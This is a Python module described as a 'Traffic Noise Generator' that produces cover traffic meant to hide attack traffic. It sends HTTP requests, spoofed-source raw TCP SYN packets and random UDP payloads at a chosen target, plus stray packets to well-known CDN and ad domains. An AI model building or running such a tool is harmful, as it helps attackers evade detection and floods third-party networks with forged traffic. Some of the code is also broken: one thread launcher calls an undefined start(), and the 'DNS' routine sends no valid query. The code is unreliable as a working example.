#!/usr/bin/env python3
"""
Traffic Noise Generator
Generate cover traffic to blend in with attack traffic
"""

import socket
import random
import threading
import time
import struct
import string
from typing import Optional, List, Tuple
from concurrent.futures import ThreadPoolExecutor


class TrafficNoise:
    """Generate cover traffic"""
    
    def __init__(self, threads: int = 10):
        self.threads = threads
        self._running = False
        self._stop_event = threading.Event()
    
    def _dns_query(self, target: str) -> None:
        """Generate DNS noise"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)
            
            # Random domain lookup
            domains = [
                'cdn.example.com',
                'api.example.com',
                'static.example.com',
                'img.example.com',
                'fonts.googleapis.com',
                'code.jquery.com',
                'cdnjs.cloudflare.com',
                'www.google-analytics.com',
                'graph.facebook.com',
                'pixel.facebook.com',
                'www.googletagmanager.com',
                'connect.facebook.net',
                'pagead2.googlesyndication.com'
            ]
            
            while not self._stop_event.is_set():
                domain = random.choice(domains)
                try:
                    ip = socket.gethostbyname(domain)
                    sock.sendto(b'\x00', (ip, 53))
                except Exception:
                    pass
                time.sleep(random.uniform(0.5, 2.0))
            
            sock.close()
        except Exception:
            pass
    
    def _http_noise(self, target: str) -> None:
        """Generate HTTP noise to target"""
        try:
            paths = ['/', '/favicon.ico', '/robots.txt', '/sitemap.xml', '/manifest.json',
                    '/css/style.css', '/js/main.js', '/images/logo.png',
                    '/api/v1/health', '/api/v1/metrics', '/api/v1/config']
            
            headers = [
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept: image/avif,image/webp,*/*',
                'Accept-Language: en-US,en;q=0.9',
                'Connection: close',
            ]
            
            while not self._stop_event.is_set():
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((target, 80))
                    
                    path = random.choice(paths)
                    request = f"GET {path} HTTP/1.1\r\nHost: {target}\r\n"
                    for h in headers:
                        request += f"{h}\r\n"
                    request += "\r\n"
                    
                    sock.sendall(request.encode())
                    sock.close()
                except Exception:
                    pass
                
                time.sleep(random.uniform(1.0, 5.0))
        except Exception:
            pass
    
    def _tcp_syn_noise(self, target: str, port: int) -> None:
        """Generate TCP SYN noise"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HEADER_INCL, 1)
            
            while not self._stop_event.is_set():
                try:
                    src_ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
                    src_port = random.randint(1024, 65535)
                    
                    ip_hdr = struct.pack('!BBHHHBBH4s4s',
                        0x45, 0, 40, random.randint(0,65535), 0x4000, 64, 6, 0,
                        socket.inet_aton(src_ip), socket.inet_aton(target))
                    
                    tcp_hdr = struct.pack('!HHIIBBHHH',
                        src_port, port,
                        random.randint(0, 0xFFFFFFFF), 0,
                        5, 0x02, 65535, 0, 0)
                    
                    sock.sendto(ip_hdr + tcp_hdr, (target, port))
                except Exception:
                    pass
                
                time.sleep(random.uniform(0.01, 0.1))
            
            sock.close()
        except Exception:
            pass
    
    def _udp_noise(self, target: str, port: int, size: int = 64) -> None:
        """Generate UDP noise"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            while not self._stop_event.is_set():
                try:
                    payload = bytes(random.getrandbits(8) for _ in range(size))
                    sock.sendto(payload, (target, port))
                except Exception:
                    pass
                
                time.sleep(random.uniform(0.05, 0.2))
            
            sock.close()
        except Exception:
            pass
    
    def start_dns_noise(self, target: str = '8.8.8.8') -> threading.Thread:
        """Start DNS noise thread"""
        self._running = True
        t = threading.Thread(target=self._dns_query, args=(target,), daemon=True)
        t.start()
        return t
    
    def start_http_noise(self, target: str) -> threading.Thread:
        """Start HTTP noise thread"""
        self._running = True
        t = threading.Thread(target=self._http_noise, args=(target,), daemon=True)
        t.start()
        return t
    
    def start_syn_noise(self, target: str, port: int = 80) -> threading.Thread:
        """Start TCP SYN noise thread"""
        self._running = True
        t = threading.Thread(target=self._tcp_syn_noise, args=(target, port,), daemon=True)
        t.start()
        return t
    
    def start_udp_noise(self, target: str, port: int = 53, size: int = 64) -> threading.Thread:
        """Start UDP noise thread"""
        self._running = True
        t = threading.Thread(target=self._udp_noise, args=(target, port, size,), daemon=True)
        start()
        return t
    
    def start_all_noise(self, target: str, ports: List[int] = None) -> List[threading.Thread]:
        """Start all noise generators"""
        ports = ports or [53, 80, 443, 8080]
        threads = []
        
        threads.append(self.start_dns_noise())
        
        for port in ports:
            if port in [80, 443, 8080]:
                threads.append(self.start_http_noise(target))
            if port == 53:
                threads.append(self.start_udp_noise(target, port, 64))
            if port in [80, 443]:
                threads.append(self.start_syn_noise(target, port))
        
        return threads
    
    def stop_all(self) -> None:
        """Stop all noise generators"""
        self._running = False
        self._stop_event.set()
